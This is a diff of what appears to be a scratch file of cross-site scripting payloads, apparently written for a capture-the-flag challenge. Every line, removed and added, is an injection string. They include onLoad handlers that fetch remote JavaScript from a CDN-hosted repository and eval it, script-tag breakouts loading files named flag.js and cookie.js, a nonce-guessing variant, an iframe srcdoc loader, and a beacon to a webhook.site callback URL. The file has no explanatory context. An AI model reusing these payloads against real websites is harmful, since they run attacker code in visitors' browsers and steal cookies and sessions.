@@ -11,13 +11,22 @@
 
 
 
-<iframe onLoad='fetch("https://cdn.jsdelivr.net/gh/3nhj0/test@main/flag.js").then(r=>r.text().then(t=>eval(t)))'></iframe>
+
+<iframe onLoad='fetch("https://webhook.site/cc325d9e-af5f-4332-b501-c54004927828")'>
 
 
-<svg onLoad='fetch("https://cdn.jsdelivr.net/gh/3nhj0/test@main/flag.js").then(r=>r.text().then(t=>eval(t)))'>
+<script>document.write('<script src="https://cdn.jsdelivr.net/gh/3nhj0/test@main/cookie.js" crossorigin="anonymous" ></scr' + 'ipt>')</script>
 
 
-<script>document.write('<script src=https://cdn.jsdelivr.net/gh/3nhj0/test@main/flag.js></scr' + 'ipt>')</script>
+</script><script src="https://cdn.jsdelivr.net/gh/3nhj0/test@main/flag.js" ></script>
+</script><script src="https://cdn.jsdelivr.net/gh/3nhj0/test@main/flag.js" nonce="asdfa"></script>
 
 
-</script><script src="https://cdn.jsdelivr.net/gh/3nhj0/test@main/flag.js"></script>
+
+
+
+
+<script></script><script src="https://cdn.jsdelivr.net/gh/3nhj0/test@main/cookie1.js" crossorigin="anonymous"></script>
+
+
+</script><iframe srcdoc='<script src="https://cdn.jsdelivr.net/gh/3nhj0/test@main/flag.js" crossorigin="anonymous"></script>'></iframe>
